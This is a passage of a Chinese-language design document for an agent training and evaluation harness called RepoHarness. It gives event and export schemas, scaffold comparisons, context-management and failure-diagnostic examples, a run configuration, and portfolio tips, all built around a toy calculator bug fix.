  "permission_decision": "allow",  // 权限系统对本次工具调用的判定
  "matched_rule": "workspace_source_file_write",  // 命中的权限规则
  "reason": "path inside workspace and permission mode auto",  // 判定、过滤或配对的原因说明
  "mode": "auto",  // 权限模式，例如 plan、ask、auto 或 deny
  "workspace_path": "calculator.py"  // 工作区内路径
}
```

工具完成事件：

```jsonc
{
  "schema_version": "repo_harness_event_v0",  // 这条记录或导出样本使用的 schema 版本，便于以后兼容旧数据
  "event_id": "evt_0009",  // events 中单条事件的稳定标识
  "timestamp": "2026-04-30T12:00:06Z",  // 事件发生时间
  "run_id": "20260430_120000_repo_task_001",  // 一次任务运行的唯一标识
  "task_id": "repo_task_001",  // 任务标识，对应 task.yaml 中的 id
  "turn": 2,  // Agent Loop 中的轮次编号
  "event_type": "tool_completed",  // 事件类型，用来区分 permission、tool、verifier、context、termination 等事件
  "severity": "info",  // 事件严重程度，例如 info、warning 或 error
  "duration_ms": 18,  // 运行或事件耗时，单位毫秒
  "tool_name": "edit_file",  // 工具名称，例如 read_file、edit_file 或 run_tests
  "tool_call_id": "call_002",  // 单次工具调用的唯一标识，必须和 tool result 配对
  "requested_arguments": {"path": "calculator.py"},  // requested_arguments: 模型原始请求参数，保留模型真实动作；path: 工作区内的相对路径示例
  "normalized_arguments": {"path": "calculator.py"},  // normalized_arguments: Tool System 规范化后的参数，例如路径和默认值；path: 工作区内的相对路径示例
  "tool_output_preview": "Edited calculator.py. Replaced 1 occurrence.",  // 工具输出的模型可见摘要
  "artifact_refs": [{"artifact_id": "artifact_diff_after_call_002"}]  // artifact_refs: 该对象引用的 artifact 列表；artifact_id: artifact manifest 中的唯一标识
}
```

Verifier 事件：

```jsonc
{
  "schema_version": "repo_harness_event_v0",  // 这条记录或导出样本使用的 schema 版本，便于以后兼容旧数据
  "event_id": "evt_0014",  // events 中单条事件的稳定标识
  "timestamp": "2026-04-30T12:00:20Z",  // 事件发生时间
  "run_id": "20260430_120000_repo_task_001",  // 一次任务运行的唯一标识
  "task_id": "repo_task_001",  // 任务标识，对应 task.yaml 中的 id
  "turn": 3,  // Agent Loop 中的轮次编号
  "event_type": "verifier_completed",  // 事件类型，用来区分 permission、tool、verifier、context、termination 等事件
  "severity": "info",  // 事件严重程度，例如 info、warning 或 error
  "duration_ms": 430,  // 运行或事件耗时，单位毫秒
  "error_type": null,  // 结构化错误类型，便于 metrics、reward 和诊断统一使用
  "artifact_refs": [{"artifact_id": "artifact_feedback_verifier_003"}],  // artifact_refs: 该对象引用的 artifact 列表；artifact_id: artifact manifest 中的唯一标识
  "verifier_stage": "feedback",  // verifier 阶段，例如 baseline、feedback 或 final
  "accepted": true,  // verifier 是否按 acceptance policy 接受当前 patch
  "pass_ratio": 1.0,  // 测试或验证项整体通过比例
  "fail_to_pass": {"passed": 1, "total": 1},  // fail_to_pass: 原本失败、目标要求修复的测试统计；passed: 通过数量；total: 总数量
  "pass_to_pass": {"passed": 2, "total": 2},  // pass_to_pass: 原本通过、要求保持通过的测试统计；passed: 通过数量；total: 总数量
  "verifier_result_ref": {"artifact_id": "artifact_feedback_verifier_003"}  // verifier_result_ref: 完整 VerifierResult artifact 引用；artifact_id: artifact manifest 中的唯一标识
}
```

### 例子 08-4：ArtifactRef 避免到处写裸路径

不推荐每个模块自己写：

```jsonc
{"stdout_path": "artifacts/verifier/final.txt"}  // 反例字段：裸路径写法，不推荐；应改用 ArtifactRef
```

推荐统一 manifest：

```jsonc
{
  "artifact_id": "artifact_final_verifier_stdout",  // artifact manifest 中的唯一标识
  "relative_path": "artifacts/verifier/final_stdout.txt",  // artifact 相对 run directory 的路径
  "kind": "verifier_stdout",  // artifact 类型，例如 verifier_stdout、diff 或 raw_provider_response
  "sha256": "sha256:...",  // artifact 内容哈希，用于完整性校验
  "size_bytes": 8120,  // artifact 文件大小
  "created_by_event_id": "evt_0022",  // 创建该 artifact 的事件标识
  "redaction_status": "not_needed",  // 脱敏状态，例如 not_needed、pending 或 redacted
  "retention_policy": "keep_for_run"  // artifact 保留策略
}
```

然后 `verifier.json`、`events.jsonl`、`summary.md` 和 export record 都引用这个 `artifact_id`。这样 hash、脱敏状态和保留策略都有统一来源。

### 例子 08-5：SFT 导出样本

一个 SFT 样本可以是：

```jsonc
{
  "schema_version": "repo_harness_export_v0",  // 这条记录或导出样本使用的 schema 版本，便于以后兼容旧数据
  "sample_id": "repo_task_001_run_0001_sft",  // 导出样本的唯一标识
  "task_id": "repo_task_001",  // 任务标识，对应 task.yaml 中的 id
  "messages": [  // SFT 导出的对话消息序列
    {"role": "system", "content": "You are a software engineering agent..."},  // role: 消息角色，例如 system、user、assistant、tool、verifier 或 termination；content: 消息或工具观察的文本内容示例
    {"role": "user", "content": "Fix division by zero handling in calculator.divide..."},  // role: 消息角色，例如 system、user、assistant、tool、verifier 或 termination；content: 消息或工具观察的文本内容示例
    {"role": "assistant", "tool_calls": [{"name": "read_file", "arguments": {"path": "calculator.py"}}]},  // role: 消息角色，例如 system、user、assistant、tool、verifier 或 termination；tool_calls: 模型请求执行的一组工具调用；name: 名称字段，例如工具名或导出对象名；arguments: 模型传给工具的原始参数；path: 工作区内的相对路径示例
    {"role": "tool", "name": "read_file", "content": "def add(a, b): ..."},  // role: 消息角色，例如 system、user、assistant、tool、verifier 或 termination；name: 名称字段，例如工具名或导出对象名；content: 消息或工具观察的文本内容示例
    {"role": "assistant", "tool_calls": [{"name": "edit_file", "arguments": {"path": "calculator.py", "old_text": "...", "new_text": "..."}}]}  // role: 消息角色，例如 system、user、assistant、tool、verifier 或 termination；tool_calls: 模型请求执行的一组工具调用；name: 名称字段，例如工具名或导出对象名；arguments: 模型传给工具的原始参数；path: 工作区内的相对路径示例；old_text: 模型期望在文件中找到并替换的旧文本；new_text: 模型希望写入的新文本
  ],
  "trainable_messages": [2, 4],  // 哪些 assistant message 参与监督微调 loss
  "loss_mask": [0, 0, 1, 0, 1],  // SFT loss 掩码，1 表示该位置作为训练目标
  "observation_mask": [0, 0, 0, 1, 0],  // 环境观察掩码，1 表示该位置是 tool observation
  "target": {  // 导出样本中的目标附加信息，例如 final patch 或终止摘要
    "final_patch": "diff --git a/calculator.py b/calculator.py\n...",  // 最终补丁文本或补丁摘要
    "termination_summary": "Final verifier accepted the patch."  // 导出样本中对运行终止结果的简短说明
  },
  "verifier": {"accepted": true, "pass_ratio": 1.0},  // verifier: reward 或导出记录中嵌入的 verifier 摘要；accepted: verifier 是否按 acceptance policy 接受当前 patch；pass_ratio: 测试或验证项整体通过比例
  "reward_metadata_ref": {"artifact_id": "artifact_reward_001", "relative_path": "reward.json"},  // reward_metadata_ref: reward.json 或 RewardMetadata artifact 的引用；artifact_id: artifact manifest 中的唯一标识；relative_path: artifact 相对 run directory 的路径
  "invalid_for_training": false,  // 该样本是否不适合进入训练
  "invalid_reason": null,  // 不适合训练的原因
  "metadata": {  // 导出样本或运行对象的补充元数据
    "scaffold_id": "simple_react",  // 使用的 scaffold，例如 simple_react
    "source_run_id": "20260430_120000_repo_task_001",  // 导出样本来源的原始 run_id
    "export_policy_version": "repo_harness_export_policy_v0"  // 训练导出策略版本
  }
}
```

核心点：assistant 的动作可以作为训练目标，tool observation 只是环境反馈，不参与 assistant loss。

### 例子 08-6：强化学习 rollout 导出样本

同一条轨迹也可以导出成 action-observation：

```jsonc
{
  "schema_version": "repo_harness_export_v0",  // 这条记录或导出样本使用的 schema 版本，便于以后兼容旧数据
  "sample_id": "repo_task_001_run_0001_rl",  // 导出样本的唯一标识
  "task_id": "repo_task_001",  // 任务标识，对应 task.yaml 中的 id
  "prompt": "Issue statement and repository context...",  // 强化学习 rollout 中的初始提示或任务上下文
  "trajectory": [  // 强化学习样本中的 action-observation 轨迹
    {
      "turn": 1,  // Agent Loop 中的轮次编号
      "action": {"type": "tool_call", "tool_name": "read_file", "arguments": {"path": "calculator.py"}},  // action: 模型在某一 turn 采取的动作；type: 动作类型，例如 tool_call；tool_name: 工具名称，例如 read_file、edit_file 或 run_tests；arguments: 模型传给工具的原始参数；path: 工作区内的相对路径示例
      "observation": {"preview": "def add(a, b): ... def divide(a, b): return a / b", "truncated": false}  // observation: 环境返回给模型的观察；preview: 模型可见观察摘要；truncated: 模型可见内容是否被截断
    },
    {
      "turn": 2,  // Agent Loop 中的轮次编号
      "action": {"type": "tool_call", "tool_name": "edit_file", "arguments": {"path": "calculator.py"}},  // action: 模型在某一 turn 采取的动作；type: 动作类型，例如 tool_call；tool_name: 工具名称，例如 read_file、edit_file 或 run_tests；arguments: 模型传给工具的原始参数；path: 工作区内的相对路径示例
      "observation": {"preview": "Edited calculator.py. Replaced 1 occurrence.", "truncated": false}  // observation: 环境返回给模型的观察；preview: 模型可见观察摘要；truncated: 模型可见内容是否被截断
    }
  ],
  "reward": 0.93,  // 该 rollout 或导出样本使用的最终奖励值
  "reward_metadata": {  // 奖励元数据摘要和 artifact 引用
    "reward_version": "repo_harness_reward_v0",  // reward metadata 计算规则版本
    "reward_metadata_ref": {"artifact_id": "artifact_reward_001", "relative_path": "reward.json"}  // reward_metadata_ref: reward.json 或 RewardMetadata artifact 的引用；artifact_id: artifact manifest 中的唯一标识；relative_path: artifact 相对 run directory 的路径
  },
  "invalid_for_training": false,  // 该样本是否不适合进入训练
  "invalid_reason": null,  // 不适合训练的原因
  "metadata": {  // 导出样本或运行对象的补充元数据
    "export_policy_version": "repo_harness_export_policy_v0",  // 训练导出策略版本
    "source_run_id": "20260430_120000_repo_task_001",  // 导出样本来源的原始 run_id
    "verifier_result_ref": {  // 完整 VerifierResult artifact 引用
      "artifact_id": "artifact_final_verifier_001",  // artifact manifest 中的唯一标识
      "relative_path": "verifier.json"  // artifact 相对 run directory 的路径
    }
  }
}
```

强化学习导出必须明确 action、observation 和 final reward，不能只导出最终 patch。

### 例子 08-7：Preference pair 导出样本

如果同一个任务有两个 rollout，一个最终成功，一个引入回归，就可以构造偏好对：

```jsonc
{
  "schema_version": "repo_harness_export_v0",  // 这条记录或导出样本使用的 schema 版本，便于以后兼容旧数据
  "sample_id": "repo_task_001_pair_0001",  // 导出样本的唯一标识
  "task_id": "repo_task_001",  // 任务标识，对应 task.yaml 中的 id
  "chosen": {  // 偏好数据中的优选 rollout
    "source_run_id": "run_success",  // 导出样本来源的原始 run_id
    "reward": 0.93,  // 该 rollout 或导出样本使用的最终奖励值
    "final_patch": "diff --git a/calculator.py b/calculator.py\n..."  // 最终补丁文本或补丁摘要
  },
  "rejected": {  // 偏好数据中的较差 rollout
    "source_run_id": "run_regression",  // 导出样本来源的原始 run_id
    "reward": 0.18,  // 该 rollout 或导出样本使用的最终奖励值
    "final_patch": "diff --git a/calculator.py b/calculator.py\n..."  // 最终补丁文本或补丁摘要
  },
  "reason": "chosen_final_verifier_accepted_and_rejected_had_pass_to_pass_regression",  // 判定、过滤或配对的原因说明
  "metadata": {  // 导出样本或运行对象的补充元数据
    "pairing_policy": "same_task_rollout_ranking_v0",  // 偏好对构造策略
    "chosen_verifier_result_ref": {  // chosen rollout 的 final verifier artifact 引用
      "artifact_id": "artifact_success_verifier_001",  // artifact manifest 中的唯一标识
      "relative_path": "runs/run_success/verifier.json"  // artifact 相对 run directory 的路径
    },
    "rejected_verifier_result_ref": {  // rejected rollout 的 final verifier artifact 引用
      "artifact_id": "artifact_regression_verifier_001",  // artifact manifest 中的唯一标识
      "relative_path": "runs/run_regression/verifier.json"  // artifact 相对 run directory 的路径
    }
  }
}
```

Preference pair 的排序理由应该来自 final verifier、reward metadata 和 failure diagnostics，而不是人工主观评价。对于第一版，如果同一任务没有足够多个 rollout，可以稳定输出 skipped reason，而不是伪造偏好对。

---

## 09-agent-scaffolds-and-multi-agent.md：不同 scaffold 如何解决同一任务

### 例子 09-1：single-shot patch

single-shot patch scaffold 让模型一次性输出补丁：

```text
User:
  Fix division by zero handling...

Assistant:
  diff --git a/calculator.py b/calculator.py
  ...
```

Harness 内部调用 patch apply 能力，然后运行 final verifier。

优点：

- 协议简单。
- 适合作为 baseline。

缺点：

- 模型没有中间测试反馈。
- 如果 patch apply 失败，模型没有机会根据工具观察修复。
- 轨迹较短，训练 long-horizon tool use 的价值有限。

### 例子 09-2：simple ReAct

simple ReAct scaffold 允许多轮读、搜、改、测：

```text
Turn 1: read_file calculator.py
Turn 2: edit_file calculator.py
Turn 3: run_tests
Turn 4: git_diff
Turn 5: final answer
```

如果测试失败，模型可以继续：

```text
Turn 3 run_tests:
  test_divide_by_zero failed: expected ValueError, got ZeroDivisionError

Turn 4 edit_file:
  add explicit ValueError branch

Turn 5 run_tests:
  all tests passed
```

这个 scaffold 是第一版最重要的 agentic baseline，因为它能产生真实 action-observation 轨迹。

### 例子 09-3：planner-coder-verifier 是顺序角色，不是远程多代理平台

对于同一任务，它可以分三段：

```text
Planner phase:
  读取 issue 和文件摘要。
  计划：检查 calculator.py 中 divide 函数，添加 b == 0 分支。

Coder phase:
  根据计划调用 edit_file 修改 calculator.py。

Verifier phase:
  调用 run_tests。
  如果失败，总结失败原因并让 coder 继续修复。
```

重要边界：

- planner、coder、verifier role 可以是同一个模型在不同 prompt fragment 下运行。
- 它们共享同一个 workspace、Tool System、Permission System、Verifier 和 Trajectory Store。
- 这里的 verifier role 只是“读测试反馈并建议下一步”的模型角色，不是系统 Verifier 模块。
- 第一版不需要后台子代理、远程代理、mailbox 或多 worktree 并行。

### 例子 09-4：公平对比实验的条件

如果比较 single-shot patch 和 simple ReAct，应该保持：

```text
同一批 task.yaml
同一套 Workspace Adapter
同一套 Tool System
同一套 Permission System
同一套 final verifier
同一套 reward metadata 计算
```

只改变：

```text
scaffold_id
scaffold_version
prompt fragment
allowed_tools
phase transition
stop condition
```

否则成功率差异可能来自工具、权限或 verifier 不一致，而不是 scaffold 策略差异。

---

## 10-context-session-and-failure-diagnostics.md：上下文治理、恢复和失败诊断

### 例子 10-1：为什么不能把完整 pytest 输出都塞回模型

假设某个真实仓库测试失败输出 80,000 字符。如果完整塞进下一轮上下文，几轮后上下文会被日志挤满。

RepoHarness 应该落盘完整输出：

```jsonc
{
  "artifact_id": "artifact_feedback_pytest_stdout_003",  // artifact manifest 中的唯一标识
  "relative_path": "artifacts/verifier/feedback_turn_003_stdout.txt",  // artifact 相对 run directory 的路径
  "kind": "verifier_stdout",  // artifact 类型，例如 verifier_stdout、diff 或 raw_provider_response
  "size_bytes": 80000  // artifact 文件大小
}
```

模型可见 preview 只保留：

```text
pytest failed.
Failing test: tests/test_calculator.py::test_divide_by_zero
Error type: ZeroDivisionError
Key traceback preview:
  with pytest.raises(ValueError, match="division by zero"):
  E   ZeroDivisionError: division by zero
Full output artifact: artifact_feedback_pytest_stdout_003
```

这样模型得到关键信息，完整证据也没有丢。

### 例子 10-2：ContentReplacementState 记录“模型当时看到什么”

假设 `tool_result_003` 第一次出现时是完整 preview：

```text
first_visible_form = "full"
first_visible_content_hash = "sha256:full_preview_hash"
```

到第 8 轮上下文太长，Context Manager 把它替换成：

```text
Earlier test output replaced. Failing test was test_divide_by_zero. Full artifact: artifact_feedback_pytest_stdout_003.
```

记录：

```jsonc
{
  "tool_call_id": "call_003",  // 单次工具调用的唯一标识，必须和 tool result 配对
  "original_tool_result_id": "tool_result_003",  // 被替换或压缩前的原始 tool result 标识
  "replaced": true,  // 该 tool result 是否已经被 replacement preview 替换
  "first_visible_form": "full",  // tool result 第一次进入模型上下文时的形态，例如 full、preview 或 replacement
  "first_visible_content_hash": "sha256:full_preview_hash",  // 第一次模型可见内容的哈希
  "replacement_allowed_after_first_seen": true,  // 第一次展示后是否允许后续压缩替换
  "replacement_text_hash": "sha256:replacement_hash",  // 替换摘要文本的哈希
  "replacement_artifact_refs": [{"artifact_id": "artifact_feedback_pytest_stdout_003"}],  // replacement_artifact_refs: 替换摘要引用的完整 artifact 列表；artifact_id: artifact manifest 中的唯一标识
  "first_seen_at_context_revision": 3,  // 该 tool result 第一次进入模型上下文的 context_revision
  "first_replaced_at_context_revision": 8  // 该 tool result 第一次被替换的 context_revision
}
```

训练导出时，如果导出第 4 轮，就应该使用完整 preview；如果导出第 9 轮，就应该使用 replacement preview。不能在导出时统一使用最终压缩版本，否则会和模型当时实际看到的内容不一致。

### 例子 10-3：session resume 的第一版边界

假设一次运行在第 6 轮崩溃。第一版没有 per-turn workspace checkpoint，因此不能声称能恢复到第 6 轮中间状态，也不能假设崩溃时一定已经存在 `final.patch`。

第一版可以做的是“从 final workspace 继续”，但前提是原 run 已经完成，或者中断处理过程已经成功冻结了 `final.patch` 和 `final.diff`。这种情况下 resume 流程是：

```text
1. 读取原 run 的 transcript.jsonl、events.jsonl、final.patch、final.diff 和 dependency_state.json。
2. 从 source checkout 创建新的 workspace。
3. 恢复 dependency_state。
4. 应用 final.patch，重建 final workspace。
5. 重新运行 verifier。
6. 用新的 run_id 继续，记录 parent_run_id 和 resume_from = "final_workspace"。
```

如果进程崩溃时还没有 `final.patch` / `final.diff`，第一版只能读取已有 `transcript.jsonl`、`events.jsonl` 和 `artifacts.json` 做诊断，把未完成工具调用标记为 `interrupted` 或 `timeout`，并在 summary 中说明 run 无法从中间 turn 恢复。它不能凭空重建第 6 轮的 workspace 状态。

如果想恢复到任意中间 turn，需要额外 artifact，例如：

```text
checkpoints/turn_0004.patch
checkpoints/turn_0005.patch
```

或者完整 workspace snapshot。没有这些证据，就不能说可以恢复到任意中间稳定 turn。

### 例子 10-4：几类 failure diagnostics

同一个 `run_outcome = "failed"` 下面可能有完全不同原因：

```jsonc
{
  "failure_type": "assertion_failure",  // 失败诊断类型
  "turn": 4,  // Agent Loop 中的轮次编号
  "tool_name": "run_tests",  // 工具名称，例如 read_file、edit_file 或 run_tests
  "details": "target test still fails"  // 失败诊断的补充说明
}
```

```jsonc
{
  "failure_type": "regression_detected",  // 失败诊断类型
  "verifier_stage": "final",  // verifier 阶段，例如 baseline、feedback 或 final
  "details": "test_add failed after final patch"  // 失败诊断的补充说明
}
```

```jsonc
{
  "failure_type": "permission_denied",  // 失败诊断类型
  "turn": 2,  // Agent Loop 中的轮次编号
  "tool_name": "bash",  // 工具名称，例如 read_file、edit_file 或 run_tests
  "details": "curl command denied under network_policy deny_agent_run"  // 失败诊断的补充说明
}
```

```jsonc
{
  "failure_type": "context_limit",  // 失败诊断类型
  "turn": 9,  // Agent Loop 中的轮次编号
  "details": "deterministic preview replacement could not reduce messages below max_context_tokens"  // 失败诊断的补充说明
}
```

这些字段让你能分析“模型能力问题、任务质量问题、上下文问题、权限问题、环境问题”分别占多少，而不是只得到一个失败数量。

### 例子 10-5：no_progress 的保守启发式

假设配置：

```yaml
runtime:  # 运行时策略配置
  no_progress_patience: 3  # 连续多少次无进展后触发 no_progress 诊断
```

最近三次 feedback verifier 都是：

```text
fail_to_pass: 0/1
pass_to_pass: 2/2
error_type: assertion_failure
```

同时最近三次 edit_file 后 `final.diff` hash 没变化，说明模型一直重复同一个无效修改。可以记录：

```jsonc
{
  "event_type": "no_progress_detected",  // 事件类型，用来区分 permission、tool、verifier、context、termination 等事件
  "recent_fail_to_pass": ["0/1", "0/1", "0/1"],  // 最近几次 feedback verifier 的 fail-to-pass 摘要，用于 no_progress 判断
  "recent_diff_hashes": ["sha256:a", "sha256:a", "sha256:a"],  // 最近几次有效 diff 的哈希，用于判断是否反复无变化
  "policy_version": "repo_harness_no_progress_policy_v0"  // 当前策略版本，例如 permission、no_progress 或其他判定规则版本
}
```

是否立刻停止由 scaffold 和 BudgetManager 决定。批量评测可以停止为 `agent_stop_reason = "no_progress"`，本地调试也可以只记录诊断并继续。

---

## 11-object-model-config-and-data-flow.md：对象模型、配置和端到端数据流

### 例子 11-1：RunConfig 如何控制一次运行

本地调试配置：

```yaml
run_id_prefix: local_eval  # 生成 run_id 时使用的前缀，用来区分实验批次
tasks:  # 本次运行要加载的任务定义文件列表
  - tasks/repo_task_001.yaml
model:  # 模型供应商和采样配置
  provider: fake  # 模型供应商标识；fake 表示脚本化模型
  model_id: scripted_calculator_fix_v0  # 具体模型或 fake model 脚本标识
  temperature: 0.0  # 采样温度
  max_output_tokens: 4096  # 单次模型响应最大输出 token 数
  retry_policy: none  # 模型调用失败时的重试策略
  credential_policy: env_only  # 模型凭据读取策略
  provider_request_logging: redact_secrets  # 供应商请求/响应 artifact 的记录和脱敏策略
runtime:  # 运行时策略配置
  scaffold_id: simple_react  # 使用的 scaffold，例如 simple_react
  execution_mode: local_process  # 命令执行模式，例如 local_process 或 docker backend
  permission_mode: auto  # 权限模式，例如 auto、deny、ask 或 plan
  max_turns: 20  # Agent Loop 最大模型调用轮数
  max_tool_calls: 80  # 单次 run 最大工具调用次数
  max_test_runs: 6  # agent run 阶段最大 run_tests 次数
  no_progress_patience: 3  # 连续多少次无进展后触发 no_progress 诊断
  task_timeout_sec: 900  # 单任务全局超时时间
  seed: 42  # 随机种子，用于可复现实验元数据
workspace:  # 工作区和输出限制配置
  output_dir: runs  # run artifacts 输出目录
  keep_workspace: true  # 运行结束后是否保留工作区用于调试
  default_command_timeout_sec: 120  # 普通命令默认超时时间
  max_tool_output_chars: 12000  # 回填给模型的工具输出最大字符数
  network_policy: deny_agent_run  # 网络策略，例如 deny_agent_run
context_management:  # 上下文治理策略配置
  max_context_tokens: 120000  # 单次模型调用最大上下文 token 预算
  tool_result_aggregate_budget_chars: 40000  # 本轮输入中所有 tool result preview 的总字符预算
  keep_recent_turns: 6  # 压缩时完整保留最近多少轮消息
  keep_recent_test_results: 2  # 完整保留最近多少次 feedback verifier 结果
  summarize_old_test_outputs: true  # 是否把旧测试输出替换为结构化摘要
  compact_strategy: deterministic_preview_replacement  # 上下文裁剪策略
  compact_threshold_ratio: 0.85  # 达到多少预算比例时开始裁剪
  context_policy_version: repo_harness_context_policy_v0  # 上下文策略版本
  token_estimator: char4_token_estimator_v0  # token 估算器版本
evaluation:  # 评测执行策略配置
  concurrency: 1  # 批量评测并发数
  rerun_final_verifier: true  # agent 停止后是否重新运行 final verifier
  final_verifier_mode: strict_patch_replay  # final verifier 模式，例如 strict_patch_replay
  fail_on_invalid_task: false  # 遇到 invalid/flaky task 时是否让批量命令失败
versions:  # 关键 schema、prompt、tool、permission 和 export 版本集合
  schema_version: repo_harness_run_v0  # 这条记录或导出样本使用的 schema 版本，便于以后兼容旧数据
  prompt_template_version: repo_harness_prompt_v0  # 提示词模板版本
  context_builder_version: repo_harness_context_v0  # Context Builder 版本
  tool_policy_version: repo_harness_tools_v0  # 工具策略版本
  permission_policy_version: repo_harness_permissions_v0  # 权限策略版本
  export_policy_version: repo_harness_export_policy_v0  # 训练导出策略版本
logging:  # 运行日志和结构化记录开关
  level: info  # 运行日志级别
  write_transcript: true  # 是否写 transcript.jsonl
  write_events: true  # 是否写 events.jsonl
```

这个配置告诉实现：

- 使用 fake model，不依赖真实供应商。
- `credential_policy` 沿用原设计中的 `env_only` 字段值；fake provider 可以不实际读取凭据，但配置字段仍保持同一套 schema。
- 使用 simple ReAct scaffold。
- 本地进程执行，但网络策略在 agent run 阶段保守限制。
- 权限模式为 auto，允许 workspace 内合理写入。
- 最终 verifier 必须 strict patch replay。
- 上下文压缩使用确定性 preview replacement。

### 例子 11-2：核心对象实例如何连接

一次运行中会出现下面这些对象：

```text
TaskDefinition
  来自 tasks/repo_task_001.yaml

RunnableTask
  Task Adapter 规范化后的任务对象

VerifierConfig
  静态测试命令和 parser 配置

BaselineResult
  setup 和 baseline verifier 后得到的任务质量门控结果

ResolvedVerifierPlan
  VerifierConfig + baseline 证据生成的运行时验证计划

RunWorkspace
  agent run workspace 路径、dependency_state、agent_start_snapshot

PreparedMessages
  每轮模型调用前真实发送给模型的 messages artifact 和 hash

ModelResponse
  模型响应、工具调用、token usage、原始响应 artifact

ToolCall
  模型请求的结构化动作

PermissionDecision
  是否允许该工具调用

ExecutionResult
  Workspace Adapter 执行命令或文件操作后的事实结果

ToolResult
  回填给模型的结构化 observation

VerifierResult
  baseline、feedback 或 final verifier 的结构化结果

RewardMetadata
  从 final verifier、events 和 diff 计算出来的 reward 证据

ExportRecord
  从完整 run artifacts 导出的训练样本
```

如果你读 `11` 的对象表感到抽象，可以把它理解为：每个对象都是某个模块对外承诺的“事实包”。模块之间不要传裸字符串和临时 dict，而要传这些可版本化、可落盘、可审计的对象。

### 例子 11-3：端到端数据流的具体故事

完整故事可以这样读：

```text
1. Eval Runner 读取 RunConfig，看到任务路径 tasks/repo_task_001.yaml。
2. Task Adapter 读取 task.yaml，输出 RunnableTask 和 VerifierConfig。
3. Workspace Adapter 创建 setup workspace，执行 pip install。
4. Workspace Adapter 在 baseline 前捕获 dependency_state。
5. Verifier 运行 baseline pytest，发现 divide_by_zero 失败，add 和 multiply 通过。
6. Eval Runner 生成 BaselineResult(status = valid)。
7. Eval Runner 生成 ResolvedVerifierPlan，记录 fail-to-pass 和 pass-to-pass。
8. Workspace Adapter 创建 agent run workspace，恢复 dependency_state，建立 agent_start_snapshot。
9. Context Builder 构造初始 messages，不泄漏 hidden metadata。
10. Context Manager 为第 1 轮生成 PreparedMessages 并落盘 provider-ready messages。
11. Fake Model 返回 read_file tool call。
12. Tool System 校验 read_file 输入。
13. Permission System 允许只读文件读取。
14. Workspace Adapter 读取 calculator.py。
15. Tool System 返回 ToolResult，Agent Loop 回填到 messages。
16. 后续模型调用 edit_file 和 run_tests。
17. Agent Loop 停止为 feedback_tests_passed。
18. Trajectory Store 从 agent_start_snapshot 冻结 final.patch 和 final.diff。
19. Final verifier 在 verification workspace 应用 final.patch 并运行 pytest。
20. Eval Runner 派生 final_verifier_status = accepted 和 run_outcome = success。
21. Reward module 生成 `RewardMetadata`。
22. Trajectory Store / RunRecorder 把 `RewardMetadata` 写成 reward.json，并生成 metrics.json 和 summary.md。
23. Training Exporter 读取完整 run directory，导出 SFT 和强化学习 rollout JSONL。
```

这个故事就是 `11` 的数据流清单的具象版本。

### 例子 11-4：统一错误口径

不同错误应该落到不同字段：

| 场景 | 字段示例 |
| --- | --- |
| 模型输出未知工具 | `agent_stop_reason` 可能最终是 `invalid_tool_call`，events 中有 `error_type = "unknown_tool"`。 |
| `edit_file` 找不到 old_text | ToolResult 是 `status = "error"`、`error_type = "patch_apply_failed"` 或 `old_text_not_found`，模型可以继续修复。 |
| final verifier 旧测试回归 | `final_verifier_status = "failed"`、`run_outcome = "failed"`、failure diagnostics 是 `regression_detected`。 |
| setup 安装依赖失败 | `BaselineResult.status = "invalid"`、`run_outcome = "invalid_task"`，不进入正式 agent run。 |
| 上下文超过预算且无法压缩 | `agent_stop_reason = "context_limit"`、`run_outcome` 根据 final verifier 是否可运行再派生。 |

统一口径的好处是：metrics、summary、导出过滤和面试叙述都不会各说各话。

---

## 12-resume-narrative-and-demo-artifacts.md：展示材料和简历叙事

### 例子 12-1：一个可以展示的 summary.md

一次成功运行的 `summary.md` 可以写：

```markdown
# Run Summary: repo_task_001

Run outcome: success
Agent stop reason: feedback_tests_passed
Final verifier status: accepted

The agent fixed division by zero handling in `calculator.divide` by adding an explicit `b == 0` branch that raises `ValueError("division by zero")`.

Final verifier ran in strict patch replay mode. The target fail-to-pass test passed, and all pass-to-pass tests remained passing.

Key artifacts:
- final.patch
- final.diff
- verifier.json
- reward.json
- transcript.jsonl
- events.jsonl
```

如果失败，也要清楚写失败类型：

```markdown
# Run Summary: repo_task_002

Run outcome: failed
Agent stop reason: feedback_tests_passed
Final verifier status: failed
Failure type: regression_detected

The feedback verifier accepted an intermediate workspace, but strict final verifier found that an existing pass-to-pass test regressed after patch replay.
```

这类 summary 既能给人看，也能帮助你面试时快速解释一次 run 的真实结果。

### 例子 12-2：展示 artifact 的最小组合

如果只展示一条任务，最有说服力的组合是：

```text
task.yaml
  说明任务怎么被定义，哪些字段模型可见，哪些字段 verifier-only。

transcript.jsonl excerpt
  说明模型如何读文件、编辑、运行测试和停止。

events.jsonl excerpt
  说明权限、工具、verifier 和终止事件如何结构化记录。

final.patch
  说明最终修改是什么。

verifier.json
  说明 success 不是人工判断，而是 final verifier 派生。

reward.json
  说明 reward metadata 如何引用 verifier、events 和 patch size。

rl_rollout.jsonl
  说明这条轨迹如何进入后续训练。
```

不要只展示最终 patch。最终 patch 只能说明“代码变了”，不能说明“训练和评测闭环成立”。

### 例子 12-3：面试时如何解释技术难点

可以这样解释 tool result 回流：

```text
我没有把工具执行当成旁路日志，而是把每个模型发出的 tool call 都强制配对成 tool result，并回填到下一轮模型上下文。这样同一条轨迹既能重放，也能导出为 action-observation 数据。未知工具、schema 错误、权限拒绝和 timeout 也都会生成合成 tool result，避免 transcript 出现半截动作。
```

可以这样解释 verifier 和 reward：

```text
我把 feedback verifier、baseline verifier 和 final verifier 设计成共用同一套 parser 和结果 schema。中间的 run_tests 可以帮助模型修复，但最终成功率、reward metadata 和训练过滤默认只认 strict final verifier。这样能减少训练 reward 和离线 evaluation 之间的口径漂移。
```

可以这样解释 permission 和 sandbox：

```text
我把 permission 和执行边界分开。Permission System 决定某个工具调用是否允许，例如是否能写文件、是否能运行 bash、是否访问了 workspace 外路径。Workspace 或 Docker-based executable repository environment 决定允许后在哪里执行、怎么限制路径、timeout、输出和 artifact。第一版不会声称生产级安全沙箱，只保守描述为任务级工作区边界和可复现执行环境。
```

### 例子 12-4：设计阶段和实现阶段的简历表述要不同

设计阶段可以写：

```text
Designed a training-aware software engineering agent harness for repository-level tasks, specifying agent loop, tool contracts, workspace boundaries, verifier-aligned reward metadata, trajectory logging, evaluation metrics, and training export schemas.
```

实现 `run_tests`、final verifier 和 trajectory recorder 以后，可以改成：

```text
Implemented verifier-aligned feedback and final evaluation paths, recorded JSONL agent trajectories with structured tool and verifier events, and exported SFT / rollout records from repository-level coding tasks.
```

如果还没有实现 Docker execution mode，不要写：

```text
